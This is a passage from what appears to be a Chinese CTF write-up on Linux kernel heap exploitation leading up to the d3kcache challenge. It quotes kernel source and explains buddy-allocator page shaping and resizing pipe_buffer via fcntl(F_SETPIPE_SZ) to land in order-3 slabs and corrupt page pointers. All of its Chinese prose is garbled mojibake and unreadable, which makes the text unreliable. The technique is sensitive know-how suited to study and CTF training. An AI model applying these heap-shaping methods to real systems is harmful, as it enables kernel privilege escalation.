<p>å¯¹æ¯”å‡½æ•°å£°æ˜å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå‚æ•°å°±ä»£è¡¨è¦å…³é—­äº†ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œè¿™ä¸ªå‡½æ•°ä¹‹å‰<code>memset(&amp;req_u, 0, sizeof(req_u));</code>æ‰§è¡Œäº†è¿™æ ·ä¸€æ¡è¯­å¥ï¼Œä¹Ÿå°±å¯¼è‡´reqä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¸º<code>\x00</code>ï¼Œä¹Ÿå°±ä¸è¿›å…¥åˆ†é…çš„åˆ†æ”¯ä¸­å»äº†ã€‚ä¸è¿‡ä¾æ—§ä¼šè¿›å…¥åˆ°è¿›è¡Œå„ç§swapçš„åˆ†æ”¯ï¼Œå› ä¸ºåœ¨åˆ†é…æ—¶èµ°è¿‡ä¸€æ¬¡ï¼Œæ‰€ä»¥è¿™æ¬¡æœ€åä¼šè°ƒç”¨åˆ°<code>free_pg_vec</code>å‡½æ•°äº†ï¼Œè€Œè¿™ä¸ªå‡½æ•°åœ¨è¿™é‡Œè¯´äº†å°±æ˜¯é‡Šæ”¾æ‰æ‰€æœ‰é¡µé¢ã€‚</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å½“æˆ‘ä»¬è€—å°½ buddy system ä¸­çš„ low order pages åï¼Œæˆ‘ä»¬å†è¯·æ±‚çš„é¡µé¢ä¾¿éƒ½æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œå› æ­¤æ­¤æ—¶æˆ‘ä»¬å†è¿›è¡Œ <code>setsockopt()</code> ä¾¿ç›¸å½“äºè·å–åˆ°äº†ä¸€å—è¿‘ä¹ç‰©ç†è¿ç»­çš„å†…å­˜ï¼ˆä¸ºä»€ä¹ˆæ˜¯â€è¿‘ä¹è¿ç»­â€œæ˜¯å› ä¸ºå¤§é‡çš„ <code>setsockopt()</code> æµç¨‹ä¸­åŒæ ·ä¼šåˆ†é…å¤§é‡æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œæ¶ˆè€— buddy system çš„éƒ¨åˆ†é¡µé¢ï¼‰ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œçš„ä½¿ç”¨æµç¨‹å°±æ˜¯ï¼Œå…ˆä½¿ç”¨ä¸Šè¿°åŠæ³•è¿›è¡Œå †å–·ã€‚</p>
<ol>
<li>é‡Šæ”¾ä¸€éƒ¨åˆ†orderä¸º3çš„pageï¼Œæ¥ç€ä½¿ç”¨victim objectè¿›è¡Œç”³è¯·è¿™äº›é¡µé¢</li>
<li>é‡Šæ”¾ä¸€ä¸ªé¡µé¢ï¼Œä½¿ç”¨vuln objectç”³è¯·è¿™ä¸€é¡µé¢</li>
<li>é‡Šæ”¾ä¸€éƒ¨åˆ†orderä¸º3çš„pageï¼Œå†æ¬¡è®©victim objectç”³è¯·åˆ°</li>
</ol>
<p><img   src="/images/VvPk5nKYmDCWxOs.png"  alt="å†å·"></p>
<p>æœ€ç»ˆå®ç°ä¸Šå›¾è¿™æ ·çš„æ•ˆæœã€‚</p>
<h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><p>åœ¨ä»¥å¾€çš„æ–‡ç« ä¸­å‡ºç°äº†å¾ˆå¤šæ¬¡çš„<code>pipe_buffer</code>ï¼Œä½†æ˜¯å¯æƒœçš„æ˜¯ä½¿ç”¨çš„æ–¹å¼è¿‡äºç®€å•ã€‚æ¯”å¦‚ï¼Œåªæ˜¯ç®€å•çš„åˆ©ç”¨ä»–çš„opsæŒ‡é’ˆè¿›è¡Œæ³„æ¼æˆ–è€…è¦†ç›–å®ƒæ§åˆ¶æ‰§è¡Œæµï¼Œå†å°±æ˜¯<code>Dirty Pipe</code>ä¸­çš„åˆ©ç”¨ã€‚å¯æ¨çš„æ˜¯æˆ‘åœ¨åšé¢˜çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æƒ³åˆ°ä½¿ç”¨<code>Dirty Pipe</code>ï¼Œå³ä¾¿æ˜¯å½“æ—¶æˆ‘å·²ç»å¯¹<code>pipe_buffer</code>æ‰€åœ¨çš„å †å—ä¸Šæœ‰ç»å¯¹çš„æƒé™äº†ã€‚æ‰€ä»¥è¿™é‡Œå°±ä¸å†åªæ˜¯å¯¹å…¶opsçš„åˆ©ç”¨äº†ï¼Œåé¢ä¸»è¦å°±æ˜¯ç ´åå…¶<code>page</code>æŒ‡é’ˆäº†ã€‚</p>
<h3 id="pipe-bufferåˆ†é…è¿‡ç¨‹"><a href="#pipe-bufferåˆ†é…è¿‡ç¨‹" class="headerlink" title="pipe_bufferåˆ†é…è¿‡ç¨‹"></a>pipe_bufferåˆ†é…è¿‡ç¨‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_DEF_BUFFERS	16</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">		pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;</span><br><span class="line">		user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);</span><br><span class="line">		pipe_bufs = PIPE_MIN_DEF_BUFFERS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">	(<span class="keyword">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">	kfree(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨åé¢ç”³è¯·<code>pipe-&gt;bufs</code>ä½¿ç”¨äº†<code>kcalloc</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åˆ†é…çš„æ•°é‡ï¼Œç¬¬äºŒå‚æ•°å°±æ˜¯æ¯ä¸€ä¸ªå•ä½çš„å¤§å°ã€‚å…¶å®åœ¨å…¶å†…éƒ¨ä¸­ä¹Ÿæ˜¯ä¼šå°†è¿™ä¸¤ä¸ªå‚æ•°ç›¸ä¹˜èµ·æ¥çš„ï¼Œè€Œè¿™ä¸¤ä¸ªå€¼å…¶å®éƒ½æ˜¯å·²çŸ¥çš„ï¼Œç¬¬ä¸€ä¸ªä¸º16ï¼Œç¬¬äºŒä¸ªä¸º40ï¼Œé‚£ä¹ˆä»–ä»¬çš„ç»“æœå°±æ˜¯640ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!size)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		index = size_index[size_index_elem(size)];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		index = fls(size - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>kcalloc</code>å‡½æ•°ä¸­ä¼šåˆ°è¿™é‡Œè¿›è¡Œé€‰æ‹©cache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">	INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾è¿™é‡Œé€‰æ‹©çš„æ˜¯<code>kmalloc-cg-1k</code>ã€‚ç„¶è€Œï¼Œ<code>kmalloc-cg-1k</code>æ¥è‡ªäº<code>order</code>ä¸º2çš„é¡µé¢ã€‚ä½†æ˜¯æ ¹æ®å‰é¢çš„æ„æ€æˆ‘ä»¬éœ€è¦<code>order</code>ä¸º3çš„é¡µé¢å‡ºæ¥çš„ï¼Œæ‰€ä»¥å¦‚æœè¿™é‡Œç”³è¯·çš„é¡µé¢<code>order</code>ä¸º2çš„è¯æˆåŠŸç‡ä¼šå¤§æ‰“æŠ˜æ‰£ã€‚</p>
<h3 id="pipe-bufferä¿®æ”¹åˆ†é…å¤§å°"><a href="#pipe-bufferä¿®æ”¹åˆ†é…å¤§å°" class="headerlink" title="pipe_bufferä¿®æ”¹åˆ†é…å¤§å°"></a>pipe_bufferä¿®æ”¹åˆ†é…å¤§å°</h3><p>pipeç»™äººçš„æƒŠå–œæ˜¯ä¸æ–­çš„ï¼Œpipeå¯ä»¥æä¾›äº†<code>fcntl(F_SETPIPE_SZ)</code>è°ƒç”¨å»ä¿®æ”¹æ¯ä¸ªpipeä¸­<code>pipe_buffer</code>çš„æ•°é‡ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_set_size</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots, size;</span><br><span class="line">	<span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue)</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">  size = round_pipe_size(arg);</span><br><span class="line">	nr_slots = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_slots)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	... ...</span><br><span class="line"></span><br><span class="line">	ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;max_usage = nr_slots;</span><br><span class="line">	pipe-&gt;nr_accounted = nr_slots;</span><br><span class="line">	<span class="keyword">return</span> pipe-&gt;max_usage * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">	(<span class="keyword">void</span>) account_pipe_buffers(pipe-&gt;user, nr_slots, pipe-&gt;nr_accounted);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ°<code>pipe_resize_ring</code>å‡½æ•°ï¼Œè¿™é‡Œä¼šæ ¹æ®sizeå¾—åˆ°<code>nr_slots</code>ï¼Œè€Œåœ¨è°ƒç”¨<code>pipe_resize_ring</code>å‡½æ•°æ—¶<code>nr_slots</code>ä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe_resize_ring</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">	bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">	mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	tail = pipe-&gt;tail;</span><br><span class="line"></span><br><span class="line">	n = pipe_occupancy(head, tail);</span><br><span class="line">	<span class="keyword">if</span> (nr_slots &lt; n) &#123;</span><br><span class="line">		spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">		kfree(bufs);</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	... ...</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯åœ¨è¿™ä¸ªå‡½æ•°å¼€å¤´çš„ä½ç½®å°±è°ƒç”¨äº†<code>kcalloc</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>fcntl</code>è°ƒç”¨ä¿®æ”¹çš„ã€‚å¦‚æœï¼Œ<code>nr_slots</code>çš„å€¼ä¸º64ï¼Œé‚£ä¹ˆç”³è¯·çš„sizeå³ä¸º<code>0xa00</code>åˆ™ä¼šç”³è¯·<code>kmalloc-4k</code>ï¼Œæ­¤æ—¶<code>order</code>ä¸º3ï¼Œå¯ä»¥å¤§å¤§æé«˜æˆåŠŸç‡ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment">	 * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment">	 * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment">	 * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	min_objects = slub_min_objects;</span><br><span class="line">	<span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment">		 * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment">		 * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment">		 * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment">		 * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment">		 * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment">		 * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		nr_cpus = num_present_cpus();</span><br><span class="line">		<span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">			nr_cpus = nr_cpu_ids;</span><br><span class="line">		min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	max_objects = order_objects(slub_max_order, size);</span><br><span class="line">	min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line">	... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯èƒ½å„ä½ä¼šç–‘æƒ‘ä¸ºä»€ä¹ˆ<code>kmalloc-4k</code>çš„<code>order</code>ä¸º3ï¼Œè¿™é‡Œé‡æ–°çœ‹<code>calculate_order</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å¯¹<code>min_objects</code>å˜é‡èµ‹å€¼çš„æœ€åä¸€ä¸ªæ“ä½œå°±æ˜¯é€‰å–æœ€å°çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>order_objects</code>å‡½æ•°å†…éƒ¨æ˜¯è¿™æ ·çš„ï¼Œå¹¶ä¸”æ­¤æ—¶<code>slub_max_order</code>çš„å€¼ä¸º3ï¼Œæ‰€ä»¥å½“sizeä¸º4kæ—¶ä¹Ÿå°±æ˜¯<code>0x1000</code>æ—¶<code>max_objects</code>çš„å€¼ä¸º0x8ï¼Œæ‰€ä»¥æŒ‰ç…§è¿™æ ·è®¡ç®—çš„è¯åç»­æ±‚å¾—çš„<code>order</code>ä¸º3ã€‚</p>
<h2 id="d3kcache"><a href="#d3kcache" class="headerlink" title="d3kcache"></a>d3kcache</h2><p>å‰é¢é“ºå«äº†è¿™ä¹ˆå¤šç»ˆäºåˆ°äº†é¢˜ç›®äº†ï¼Œå¦‚æœæœ‰äº†å‰é¢æåˆ°çš„æ‰€æœ‰åŸºç¡€ç†è®ºçŸ¥è¯†å†æ¥çœ‹è¿™é“é¢˜çš„è¯ï¼Œ<del>ä¾æ—§æ— æ³•å¾ˆè½»æ¾çš„å®Œæˆ</del>ã€‚</p>
<p>é¢˜ç›®åœ¨å¼€äº†åŸºæœ¬çš„ä¿æŠ¤ä¹‹å¤–è¿˜å¼€å¯äº†å¾ˆå¤šçš„ç¼–è¯‘é€‰é¡¹ä¸­çš„ä¿æŠ¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure>

<p>è¿™äº›åŸºæœ¬çš„éƒ½æ˜¯å¼€å¯äº†çš„ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¼€å¯äº†ä¸€ä¸ª<code>Control Flow Integrity</code>ä¿æŠ¤ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure>

